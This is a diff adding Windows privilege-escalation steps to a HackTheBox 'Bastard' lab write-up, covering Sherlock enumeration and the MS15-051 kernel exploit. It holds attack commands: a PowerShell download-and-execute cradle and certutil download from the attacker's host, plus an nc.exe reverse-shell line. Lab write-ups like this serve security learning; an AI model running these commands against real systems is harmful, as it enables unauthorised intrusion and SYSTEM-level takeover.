@@ -172,7 +172,8 @@ Disallow: /?q=user/logout/
 ![better shell](../.res/2022-09-05-13-44-07.png)
 
 - We have some creds in sites\default\settings.php
-```
+
+```bash
 $databases = array (
   'default' => 
   array (
@@ -237,14 +238,36 @@ Network Card(s):           1 NIC(s) Installed.
                                  [01]: 10.10.10.9
 ```
 
-- We can run winpeas. We will use the bat version because the exe does not work.
+- We can run winpeas. We will use the bat version because the exe does not work. (not really helpful here)
+- We can try sherlock that can be found [here](https://github.com/rasta-mouse/Sherlock) or here on kali if you have empire installed: `/usr/share/powershell-empire/empire/server/data/module_source/privesc/Sherlock.ps1`
+- `cp /usr/share/powershell-empire/empire/server/data/module_source/privesc/Sherlock.ps1 /home/kali/Documents/hackthebox/bastard` copying it to my working directory
+- At the end of the script we need to add a line `Find-AllVulns` like this  
+![Sherlock.ps1](../.res/2022-09-10-15-38-09.png)
+- `echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.3/Sherlock.ps1') | powershell -noprofile -` We download our script and execute it. And it works we get a lot of info.
+- We find 2 possible exploits
 
-<!-- 
+```dos
+Title      : Task Scheduler .XML
+MSBulletin : MS10-092
+CVEID      : 2010-3338, 2010-3888
+Link       : https://www.exploit-db.com/exploits/19930/
+VulnStatus : Appears Vulnerable
 
-TODO:
-- Continue enum for privesc with linpeas.bat
-- use win exploit suggester
-- Check out all manual enum checks for privesc possible from my notes to be sure not to miss anything
--->
+Title      : ClientCopyImage Win32k
+MSBulletin : MS15-051
+CVEID      : 2015-1701, 2015-2433
+Link       : https://www.exploit-db.com/exploits/37367/
+VulnStatus : Appears Vulnerable
+```
 
-**Coming soon**
+### MS15-051
+
+- The given exploit by sherlock requires metasploit. If we search around a little we find [this article](https://vk9-sec.com/windows-exploit-ms15-051-cve-2015-1701-privilege-escalation/) that gives an exploit without metasploit
+- `wget https://github.com/SecWiki/windows-kernel-exploits/raw/master/MS15-051/MS15-051-KB3045171.zip` get the exploit in our kali
+- `unzip MS15-051-KB3045171.zip` we unzip it
+- `certutil.exe -urlcache -f http://10.10.14.3/ms15-051x64.exe exploit64.exe` we get the exploit (we need x64 see systeminfo above)
+- We launch it it needs a command we will use cmd `exploit64.exe cmd` and get an autority system shell.  
+We could also have used a command like `nc.exe IP-OF-KALI PORT -e cmd.exe` and we would get a reverse shell as system (do not forget to set up a listener if you do this)  
+![whoami](../.res/2022-09-10-16-20-21.png)  
+- We just need to grab the root flag `type C:\Users\Administrator\Desktop\root.txt`  
+![root flag](../.res/2022-09-10-16-21-31.png)  
